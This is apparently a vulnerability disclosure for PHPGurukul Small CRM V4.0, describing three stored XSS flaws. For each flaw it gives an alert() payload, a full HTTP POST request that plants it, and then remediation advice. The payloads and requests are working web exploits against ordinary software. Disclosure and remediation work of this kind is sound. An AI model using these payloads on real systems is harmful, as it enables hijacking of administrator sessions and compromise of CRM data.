# PHPGurukul Small CRM in PHP V4.0 Multiple Stored Cross-Site Scripting (XSS) Vulnerabilities

## NAME OF AFFECTED PRODUCT(S)

- Small CRM in PHP

## Vendor Homepage

- [Small CRM in PHP](https://phpgurukul.com/small-crm-php/)

## AFFECTED AND/OR FIXED VERSION(S)

### submitter

- YoSheep

### VERSION(S)

- V4.0

### Software Link

- https://phpgurukul.com/?sdm_process_download=1&download_id=10412

## PROBLEM TYPE

### Vulnerability Type

- Stored Cross-Site Scripting (XSS)

### Root Cause

- The application fails to properly sanitize or encode user-supplied input across multiple modules. User-provided data is stored in the database and later rendered directly in the administrator panel without output encoding. This unsafe practice allows persistent JavaScript injection and execution within the admin's browser.

### Impact

* Exploitation of these vulnerabilities allows attackers to execute arbitrary JavaScript in the administrator’s browser, which may result in theft of session cookies and authentication tokens, unauthorized actions performed with elevated privileges, phishing or malware delivery via the admin panel, and ultimately a complete compromise of CRM data and potential system takeover.

## **DESCRIPTION**

* A security assessment of the *Small CRM in PHP V4.0* revealed multiple stored Cross-Site Scripting (XSS) vulnerabilities in different modules:

  1. Registration Module → User Management
     - Input: /crm/registration.php (username field)
     - Trigger: /crm/admin/manage-users.php when the admin views registered users.
  2. Ticket Module → Ticket Management
     - Input: /crm/create-ticket.php (ticket details field)
     - Trigger: /crm/admin/manage-tickets.php when the admin views submitted tickets.
  3. Quote Module → Quote Details
     - Input: /crm/get-quote.php (quote query field)
     - Trigger: /crm/admin/quote-details.php?id=<id> when the admin views quote details.

  All three issues stem from missing output encoding, enabling unauthenticated attackers to inject persistent JavaScript payloads that are executed in the context of the administrator’s browser session.

## Vulnerability Details and Proof of Concept (PoC)

### Vulnerability type:

* Stored Cross-Site Scripting (XSS)

### Vulnerability location:

* Parameter: email (POST)

### Case 1: Registration Module

- **Input parameter**: username

- **Input file**: /crm/registration.php
- **Trigger file**: /crm/admin/manage-users.php

PoC Payload (as username during registration): 

```
<img src="#" onerror=alert("XSS")>
```

```
POST /crm/registration.php HTTP/1.1
Host: xxx.xxx.xxx.xxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 153
Origin: http://xxx.xxx.xxx.xxx
Connection: keep-alive
Referer: http://xxx.xxx.xxx.xxx/crm/registration.php
Cookie: PHPSESSID=uqub0pe6484q6qpgmfm3d3mdu7
Upgrade-Insecure-Requests: 1
Priority: u=0, i

name=%3Cimg+src%3D%22%23%22+onerror%3Dalert%28%22XSS%22%29%3E&email=123%40qq.com&password=www222&cpassword=www222&phone=1234567890&gender=m&submit=Submit
```

When admin accesses /crm/admin/manageability users. php, the payload is automatically triggered.

screenshot：

![image-20250827013815743](https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250827013815743.png)

### Case 2: Ticket Module

- **Input parameter**: ticket (subject or description)
- **Input file**: /crm/create-ticket.php
- **Trigger file**: /crm/admin/manage-tickets.php

PoC Payload (in ticket subject or description): 

```
<img src="#" onerror=alert("XSS")>
```

```
POST /crm/create-ticket.php HTTP/1.1
Host: xxx.xxx.xxx.xxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 132
Origin: http://xxx.xxx.xxx.xxx
Connection: keep-alive
Referer: http://xxx.xxx.xxx.xxx/crm/create-ticket.php
Cookie: PHPSESSID=uqub0pe6484q6qpgmfm3d3mdu7
Upgrade-Insecure-Requests: 1
Priority: u=0, i

subject=%3Cimg+src%3D%22%23%22+onerror%3Dalert%28%22XSS%22%29%3E&tasktype=Select+your+Task+Type&priority=&description=test&send=Send
```

When admin accesses /crm/admin/manage-tickets.php, the payload is automatically triggered.

screenshot

![image-20250827014211438](https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250827014211438.png)

### **Case 3: Quote Module**

- **Input parameter**: query
- **Input file**: /crm/get-quote.php
- **Trigger file**: /crm/admin/quote-details.php?id=x

PoC Payload (in quote query field):

```
<img src="#" onerror=alert("XSS")>
```

```
POST /crm/get-quote.php HTTP/1.1
Host: 101.126.24.194
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundary1810b5edb25cbdbeb426bc57ecf57676
Content-Length: 934
Origin: http://101.126.24.194
Connection: keep-alive
Referer: http://101.126.24.194/crm/get-quote.php
Cookie: PHPSESSID=uqub0pe6484q6qpgmfm3d3mdu7
Upgrade-Insecure-Requests: 1
Priority: u=0, i

------geckoformboundary1810b5edb25cbdbeb426bc57ecf57676
Content-Disposition: form-data; name="name"

<img src=# onerror=alert(1)>
------geckoformboundary1810b5edb25cbdbeb426bc57ecf57676
Content-Disposition: form-data; name="contact"

1231231231
------geckoformboundary1810b5edb25cbdbeb426bc57ecf57676
Content-Disposition: form-data; name="wdnd"

Website Design & Development
------geckoformboundary1810b5edb25cbdbeb426bc57ecf57676
Content-Disposition: form-data; name="email"

1123123@qq.com
------geckoformboundary1810b5edb25cbdbeb426bc57ecf57676
Content-Disposition: form-data; name="company"

123
------geckoformboundary1810b5edb25cbdbeb426bc57ecf57676
Content-Disposition: form-data; name="query"

<img src="#" onerror=alert("XSS")>
------geckoformboundary1810b5edb25cbdbeb426bc57ecf57676
Content-Disposition: form-data; name="submit"

Submit
------geckoformboundary1810b5edb25cbdbeb426bc57ecf57676--
```

When admin views a specific quote via /crm/admin/quote-details.php?id=x, automatically trigger the payload of css.

screenshot

![image-20250827014747821](https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250827014747821.png)

## Suggested Remediation

1. **Output Encoding**

   Apply htmlspecialchars() or equivalent to escape user input before rendering in the HTML context of admin pages.

2. **Input Validation and Sanitization**

   Validate user inputs to allow only safe characters in usernames, ticket descriptions, and quote queries. Reject or sanitize malicious patterns.

3. **Content Security Policy (CSP)**

   Implement a strict CSP to prevent the execution of inline scripts and mitigate potential XSS exploitation.

4. **Context-Aware Escaping**

   Ensure escaping strategies match the output context (HTML, attributes, JavaScript, etc.).

5. **Security Testing and Code Review**

   Integrate static code analysis, dynamic application testing, and regular penetration tests into the SDLC to detect and remediate XSS vulnerabilities early.